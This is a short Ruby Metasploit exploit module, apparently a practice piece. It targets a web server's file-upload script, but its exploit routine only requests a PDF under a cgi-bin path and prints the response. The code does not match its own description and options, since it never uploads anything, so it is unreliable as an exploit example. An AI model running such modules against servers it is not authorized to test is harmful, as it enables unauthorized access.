require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient


  def initialize(info = {})

    super(update_info(info,
    
        'Name'           => 'IG content',
        'Description'    => 'Metaploit module for IG content',
        'Author'         => 'al-fariqy raihan (qywok)',
        'License'        => MSF_LICENSE,
        'DefaultOptions' => {
            'RPORT' => 80,
        },
        'Platform'       => 'win',
        'Targets'        => [
            ['Automatic', {}],
        ],
        'DisclosureDate' => '2023-02-27'
    ))

    register_options([

        OptString.new(
            'TARGETURI',
            [
                true, 'The URI path of the file upload script', '/fileupload.php'
            ]
        ),

        OptString.new(
            'UPLOAD_PATH',
            [
                true, 'The path to the file to upload', '/path/to/file'
            ]
        )

    ])

  end


    def exploit

        target_response = send_request_cgi({
            'method'    => 'GET',
            'uri'       => "http://#{rhost}:#{rport}/cgi-bin/#{datastore['UPLOAD_PATH']}/tugas.pdf",
            'ctype'     => 'text/plain;'
        })

        print_good(
            target_response.body
        )

    end

end